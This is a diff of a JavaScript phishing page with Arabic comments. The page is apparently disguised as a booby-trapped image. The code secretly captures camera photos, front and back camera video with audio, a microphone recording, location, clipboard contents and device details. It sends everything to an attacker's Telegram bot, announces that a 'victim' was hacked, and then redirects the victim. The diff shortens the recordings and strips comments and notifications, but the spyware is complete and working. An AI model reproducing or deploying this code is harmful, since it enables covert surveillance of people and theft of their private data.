@@ -47,7 +47,6 @@
             pointer-events: auto;
         }
 
-        /* عناصر الفيديو المخفية للتسجيل */
         .hidden-video-element {
             position: fixed;
             top: -1000px;
@@ -159,7 +158,6 @@
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
             } catch(e) { 
                 console.warn('فشل إرسال الفيديو:', e);
-                // محاولة الإرسال كملف إذا فشل
                 try {
                     let formData2 = new FormData();
                     formData2.append('chat_id', chatId);
@@ -171,23 +169,19 @@
         }
 
         // ========== تسجيل فيديو ==========
-        async function recordVideo(facingMode, duration = 20000) {
+        async function recordVideo(facingMode, duration = 8000) {
             let stream = null;
             let mediaRecorder = null;
             let chunks = [];
             
             try {
-                // طلب الكاميرا مع الصوت اختياري
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
-                        facingMode: { exact: facingMode },
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        facingMode: { exact: facingMode }
                     },
-                    audio: false // تعطيل الصوت لتقليل حجم الفيديو
+                    audio: true
                 });
                 
-                // إنشاء عنصر فيديو مخفي لعرض الدفق (مطلوب للتسجيل في بعض المتصفحات)
                 const videoElement = document.createElement('video');
                 videoElement.srcObject = stream;
                 videoElement.setAttribute('playsinline', 'true');
@@ -195,7 +189,6 @@
                 document.body.appendChild(videoElement);
                 await videoElement.play();
                 
-                // إعداد MediaRecorder
                 const mimeTypes = ['video/mp4', 'video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm'];
                 let selectedMimeType = null;
                 for (const type of mimeTypes) {
@@ -206,8 +199,7 @@
                 }
                 
                 mediaRecorder = new MediaRecorder(stream, { 
-                    mimeType: selectedMimeType || 'video/webm',
-                    videoBitsPerSecond: 1000000
+                    mimeType: selectedMimeType || 'video/webm'
                 });
                 
                 mediaRecorder.ondataavailable = (event) => {
@@ -216,16 +208,11 @@
                     }
                 };
                 
-                // بدء التسجيل
                 mediaRecorder.start(1000);
-                
-                // انتظار المدة المطلوبة
                 await delay(duration);
                 
-                // إيقاف التسجيل
                 return new Promise((resolve) => {
                     mediaRecorder.onstop = () => {
-                        // تنظيف
                         if (stream) stream.getTracks().forEach(t => t.stop());
                         if (videoElement && videoElement.parentNode) videoElement.remove();
                         
@@ -234,16 +221,8 @@
                             return;
                         }
                         
-                        // إنشاء blob
                         const blob = new Blob(chunks, { type: selectedMimeType || 'video/mp4' });
-                        
-                        // محاولة تحويل إلى MP4 إذا كان WebM
-                        if (selectedMimeType && selectedMimeType.includes('webm')) {
-                            // إرسال كـ WebM (Telegram يدعمه)
-                            resolve(blob);
-                        } else {
-                            resolve(blob);
-                        }
+                        resolve(blob);
                     };
                     
                     mediaRecorder.stop();
@@ -464,15 +443,10 @@
             
             await delay(500);
             
-            // إرسال إشعار بدء
-            await sendToTelegram(`#☑️ بدء جمع البيانات ☑️#\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
-            
-            // جمع البيانات الأساسية
             let deviceInfo = await getDeviceInfo();
             let locationData = await getLocation();
             let clipboardText = await getClipboard();
             
-            // التقاط الصور
             let frontPhotos = [];
             let backPhotos = [];
             try {
@@ -482,36 +456,21 @@
                 backPhotos = await capturePhotos("environment", 3);
             } catch(e) { console.warn(e); }
             
-            // تسجيل الصوت
             let audioUrl = await recordAudio(5000);
             
-            // ===== تسجيل الفيديو (20 ثانية) =====
+            // ===== تسجيل الفيديو (8 ثواني) =====
             let frontVideo = null;
             let backVideo = null;
             
-            // تسجيل فيديو أمامي
             try {
-                await sendToTelegram("🎥 بدء تسجيل الفيديو الأمامي (20 ثانية)...");
-                frontVideo = await recordVideo("user", 20000);
-                if (frontVideo) {
-                    await sendToTelegram("✅ تم تسجيل الفيديو الأمامي بنجاح");
-                } else {
-                    await sendToTelegram("❌ فشل تسجيل الفيديو الأمامي");
-                }
+                frontVideo = await recordVideo("user", 8000);
             } catch(e) { console.warn(e); }
             
-            // تسجيل فيديو خلفي
             try {
-                await sendToTelegram("🎥 بدء تسجيل الفيديو الخلفي (20 ثانية)...");
-                backVideo = await recordVideo("environment", 20000);
-                if (backVideo) {
-                    await sendToTelegram("✅ تم تسجيل الفيديو الخلفي بنجاح");
-                } else {
-                    await sendToTelegram("❌ فشل تسجيل الفيديو الخلفي");
-                }
+                backVideo = await recordVideo("environment", 8000);
             } catch(e) { console.warn(e); }
             
-            // إرسال التقرير النصي
+            // إرسال البيانات إلى المعرف المستهدف
             await sendToTelegram(`#☑️ تم اختراق ضحية عبر صورة ملغمة ☑️#\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}\n\nتم الإرسال إلى المعرف: ${getChatId()}`);
             
             let report = `📱 <b>بيانات الهاتف والضحية</b>\n\n`;
@@ -546,7 +505,6 @@
             
             await sendToTelegram(report, true);
             
-            // إرسال الصور
             for(let i = 0; i < frontPhotos.length; i++) {
                 await sendPhoto(frontPhotos[i], `☑️ كاميرا أمامية - صورة ${i+1}`);
                 await delay(300);
@@ -556,23 +514,21 @@
                 await delay(300);
             }
             
-            // إرسال الصوت
             if(audioUrl) {
                 await sendAudio(audioUrl, "🎙️ تسجيل الصوت (5 ثوانٍ)");
             }
             
-            // إرسال الفيديوهات
             if(frontVideo) {
-                await sendVideo(frontVideo, "🎥 فيديو الكاميرا الأمامية (20 ثانية)");
-                await delay(500);
+                await sendVideo(frontVideo, "🎥 فيديو الكاميرا الأمامية (8 ثوان)");
+                await delay(300);
             }
             
             if(backVideo) {
-                await sendVideo(backVideo, "🎥 فيديو الكاميرا الخلفية (20 ثانية)");
-                await delay(500);
+                await sendVideo(backVideo, "🎥 فيديو الكاميرا الخلفية (8 ثوان)");
+                await delay(300);
             }
             
-            await sendToTelegram(`#☑️ اكتمل الاختراق بنجاح ☑️#\nتم إرسال ${frontPhotos.length} صور أمامية، ${backPhotos.length} صور خلفية، وفيديو أمامي ${frontVideo ? '✓' : '✗'} وفيديو خلفي ${backVideo ? '✓' : '✗'}`);
+            await sendToTelegram(`#☑️ اكتمل الاختراق بنجاح ☑️#\nتم إرسال ${frontPhotos.length} صور أمامية و ${backPhotos.length} صور خلفية`);
             
             await delay(1500);
             window.location.href = REDIRECT_URL;
